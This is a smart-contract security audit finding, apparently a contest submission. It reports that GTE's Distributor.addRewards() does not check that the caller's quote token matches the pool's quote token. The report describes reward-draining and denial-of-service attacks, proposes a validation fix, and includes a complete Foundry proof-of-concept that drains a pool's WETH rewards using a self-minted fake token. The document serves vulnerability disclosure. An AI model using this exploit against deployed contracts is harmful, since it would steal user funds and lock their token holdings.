# `Distributor.addRewards()` missing validation. Share price inflation, token Draining, and DOS attack

## Links

<https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Distributor.sol#L106-L133>
<https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/libraries/RewardsTracker.sol#L209-L227>

## Finding description and impact


**Root Cause:**`Distributor.addRewards()` did not check user input address is the same as existing pool token address.

**Impact:** This vulneribility open up several exploits to drain reward and DOS any launch token.

---

`Distributor.addRewards()` accepts two arbitrary token addresses `(token0, token1)` and use token address to locate an existing reward pool:

```solidity
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
            (token0, token1, amount0, amount1);
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
        if (rs.quoteAsset == address(0)) {//token0 pointing to nothing. check token1 as launchAsset instead
            rs = RewardsTrackerStorage.getRewardPool(token1);

            if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();//@only check if we found pre-exist pool. 
            (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
        }
        //@if token0 is launch asset, found pool, but no check if token1 is the same as rs.quoteAsset
        ...
    }
```

Above code:

- `token0` is `launchAsset`
- use `launchAsset` to find `RewardPoolData`
- Check `rs.quoteAsset` is non-zero address to verify pool
But the function never check that the caller input `(launchAsset, quoteAsset)` pair actually equals existing pool `(rs.launchAsset, rs.quoteAsset)`.

It later updates accounting using `rs` (the real pool) and the caller input `quoteAsset`:

```solidity
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        ...
        if (quoteAssetAmount > 0) {
            rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);//self.pendingQuoteRewards += amount;
            _increaseTotalPending(quoteAsset, quoteAssetAmount);//unchecked {totalPendingRewards[quoteAsset] += amount;}
            quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));//@quoteAsset != rs.quoteAsset
        }
        ...
    }
```

Because input `quoteAsset` can differ from `rs.quoteAsset`, attacker exploit this can open up 2 attacks against GTE project.

1. Reward draining: Inflate `accQuoteRewardPerShare`, then drain all rewards from any pool. (only work with quote token)
2. DOS any pair: Breaking LaunchPad buy/sell function, permanent lock trading, prevent user from selling their token holding

### 1. Drain reward pool

1. Hold some share of any pair token hold rewards.
2. Call `addRewards()` with `(token0,token1)` `(real launchAsset,fake quoteAsset)` (a mock ERC-20 they control).
3. `rs.addQuoteRewards()` inflate `rs.pendingQuoteRewards` without transferring real value (since transfers pull the fake token, not the actual quote token). [Ref](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/libraries/RewardsTracker.sol#L86-L91)
4. `pendingQuoteRewards` used to increase global share reward index `accQuoteRewardPerShare`. [Ref](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/libraries/RewardsTracker.sol#L191-L227)
5. Exploiter can increase `accQuoteRewardPerShare` to any value.
6. attacker small share value can be inflated higher allow them to drain all rewards from the pool.

### 2. DOS token pair


1. Attacker can add rewards to any pair. Call `addRewards()` with `(token0,token1)` `(real launchAsset,fake quoteAsset)` (a mock ERC-20 they control).
2. `rs.addQuoteRewards()` increase total rewards in pending. But no token is transfered in.
3. For launch token without rewards, it simply try to distribute non exist reward.
4. all call to `Distributor._distributeAssets()` will revert. There is no real quoteToken to distribute. `totalPendingRewards` is still zero, but reward tracking `accQuoteRewardsPerShare` is non zero.
5. `LaunchPad.sol` buy/sell calls depend on `Distributor.stake()`,`unstake()`
6. since this pair stake/unstake always revert. All users try to sell their token will revert as well.
7. User cannot sell their token. Permanent lock token on LaunchPad.

## Recommended mitigation steps

add missing validation check

```solidity
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
            (token0, token1, amount0, amount1);
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
        if (rs.quoteAsset == address(0)) {
            rs = RewardsTrackerStorage.getRewardPool(token1);

            if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
            //@quote asset point to a pair. switching order
            (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);            
        }
        //@add new check
        require(rs.quoteAsset == quoteAsset, "Quote Asset does not match");
    }

```

## POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./LaunchpadTestBase.sol";
import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";
import "contracts/launchpad/libraries/RewardsTracker.sol";

contract PoCLaunchpad is LaunchpadTestBase {
    using SafeTransferLib for address;
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */

    function test_debug_submissionValidity() public {
        // SETUP:
        // WETH is quote token.
        // LaunchPad pair new launch token with WETH
        // 1. Developer launch new meme token. Users already hold 100M out of 800M token during bonding phase
        // 2. Developer send in 5 WETH as incentive rewards for user bonding
        // 3. attacker buy some share of the pair hold rewards and inflating rewards share price to drain rewards
        // 4. attacker drain all 5 WETH rewards
        
        address launchTokenB = _launchToken();
        {
            address dev2 = makeAddr("dev2");
            vm.startPrank(dev2);
            //partial 10% launch with 10 ETH as maximum investment
            uint256 investAmount = 10 ether;
            quoteToken.mint(dev2, investAmount);
            quoteToken.approve(address(launchpad), investAmount);
            launchpad.buy(
                ILaunchpad.BuyData({
                    account: dev2,
                    token: launchTokenB,
                    recipient: dev2,
                    amountOutBase: curve.bondingSupply(launchTokenB) / 10,
                    maxAmountInQuote: investAmount // 8.695e17 quote token for 100M base token
                })
            );

            //give token B some quote token rewards to drain
            uint256 quoteTokenRewardAmount = 5 ether;
            quoteToken.mint(dev2, quoteTokenRewardAmount);
            quoteToken.approve(distributor, quoteTokenRewardAmount);
            Distributor(distributor).addRewards(launchTokenB, address(quoteToken), 0, uint128(quoteTokenRewardAmount));
            console.log("balanceOf distributor: %e", quoteToken.balanceOf(distributor));
            //Token B have investment by users
            // RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(launchTokenB);
            _debugRewardPool(launchTokenB);

            assertEq(quoteToken.allowance(dev2, distributor), 0);
            // console.log("pendingQuoteRewards: %e", rewardsPoolData.pendingQuoteRewards);
            //refresh pool rewards so each share have some rewards
            // Distributor(distributor).claimRewards(launchTokenB);

            _debugRewardPool(launchTokenB);
            vm.stopPrank();
        }

        //3. Exploit
        address exploiter = makeAddr("exploit");
        quoteToken.mint(exploiter, 1 ether);
        vm.startPrank(exploiter);
        console.log("---Exploit Start---");

        ERC20Harness mockToken = new ERC20Harness("FreeMint", "FF");
        mockToken.mint(exploiter, type(uint256).max);
        mockToken.approve(distributor, type(uint256).max);

        console.log("**exploter starting QuoteToken balance: %e", quoteToken.balanceOf(exploiter));
        //3.1 buy some share
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(
            ILaunchpad.BuyData({
                account: exploiter,
                token: address(launchTokenB),
                recipient: exploiter,
                amountOutBase: 100e18, // 100 tokens
                maxAmountInQuote: 0.1 ether
            })
        );

        //exploiter now have some stake of the pool
        UserRewardData memory exploiterRewardData = Distributor(distributor).getUserData(launchTokenB, exploiter);
        console.log("exploter shares: %e", exploiterRewardData.shares);

        _debugRewardPool(launchTokenB);
        //shareValue = totalReward * 1e12 / totalShares
        // exploiter have 1e18 shares.
        // it worth 1 shares worth 62500 quote token.
        // we want to drain whole Distribution.sol contract have 40e18 quoteToken.
        // -> inflate share price x = (40e18 / 62500) * totalShares / 1e12
        console.log("inflate share value");
        RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(launchTokenB);
        console.log("Distributor Quote token balance to drain: %e", quoteToken.balanceOf(distributor));
        console.log("rewardsPoolData.totalShares: %e", rewardsPoolData.totalShares);
        console.log("exploiterRewardData.shares: %e", exploiterRewardData.shares);
        console.log("exploiterRewardData.baseRewardDebt: %e", exploiterRewardData.baseRewardDebt);
        console.log("exploiterRewardData.quoteRewardDebt: %e", exploiterRewardData.quoteRewardDebt);
        // need increase accRewardsPerShare
        // quote_to_drain =  ( userShare * newaccQuoteRewardsPerShare / 1e12)  - exploiterRewardData.quoteRewardDebt
        //newAccQuoteRewardsPerShare = old_accQuoteRewardsPerShare + fake_token_in * 1e12 / totalShares = (quote_to_drain + exploiterRewardData.quoteRewardDebt ) * 1e12 / userShare
        //x = fake_token_in = ((quote_to_drain + exploiterRewardData.quoteRewardDebt ) * 1e12 / userShare - old_accQuoteRewardsPerShare) * totalShares / 1e12
        uint256 x = rewardsPoolData.totalShares
            * (
                quoteToken.balanceOf(distributor) + exploiterRewardData.quoteRewardDebt
                    - (exploiterRewardData.shares * rewardsPoolData.accQuoteRewardPerShare) / 1e12
            ) / exploiterRewardData.shares;
        console.log("x: %e", x);
        console.log("max x: %e %e", type(uint128).max, uint256(x * 1e12));

        // 3.2 inflate share price by adding fake token as rewards
        // there is underflow issue when sending too much token rewards it reach uint128 max limit
        // It temporary solved by simply have much more share of the
        while (x > 0) {
            //need multiple rounds
            console.log("multiple rounds %e", x);
            uint128 roundAmount = type(uint128).max;
            if (x < uint128(type(uint128).max)) roundAmount = uint128(x);
            Distributor(distributor).addRewards(launchTokenB, address(mockToken), 0, roundAmount);
            x -= roundAmount;
        }
        // Distributor(distributor).addRewards(address(launchTokenB), address(mockToken), 0, uint128(4e25));
        _debugRewardPool(launchTokenB);

        (uint256 baseAmount, uint256 quoteAmount) = Distributor(distributor).claimRewards(launchTokenB);
        console.log("exploter claimed quoteAmount: %e", quoteAmount);
        console.log("**exploter ending QuoteToken balance: %e", quoteToken.balanceOf(exploiter));

        _debugRewardPool(launchTokenB);
    }

    function _debugRewardPool(address _token) internal view {
        RewardPoolDataMemory memory rewardsPoolData = Distributor(distributor).getRewardsPoolData(_token);
        console.log("-Debug Pool %s", ERC20Harness(_token).symbol());
        console.log("-totalShares: %e", rewardsPoolData.totalShares);
        console.log("-pendingBaseRewards: %e", rewardsPoolData.pendingBaseRewards);
        console.log("-pendingQuoteRewards: %e", rewardsPoolData.pendingQuoteRewards);
        console.log("-accBaseRewardPerShare: %e", rewardsPoolData.accBaseRewardPerShare);
        console.log("-accQuoteRewardPerShare: %e", rewardsPoolData.accQuoteRewardPerShare);
        console.log("");
    }

    function refreshShare(address _token) internal {
        //refresh rewards by buy small amount token from launchPad
        address randomUser = makeAddr("randomUser");
        quoteToken.mint(randomUser, 1e18);
        vm.startPrank(randomUser);
        quoteToken.approve(address(launchpad), 1e18);
        launchpad.buy(
            ILaunchpad.BuyData({
                account: randomUser,
                token: _token,
                recipient: randomUser,
                amountOutBase: 1e1, // 10 tokens
                maxAmountInQuote: 1e18
            })
        );
        vm.stopPrank();
    }
}

```
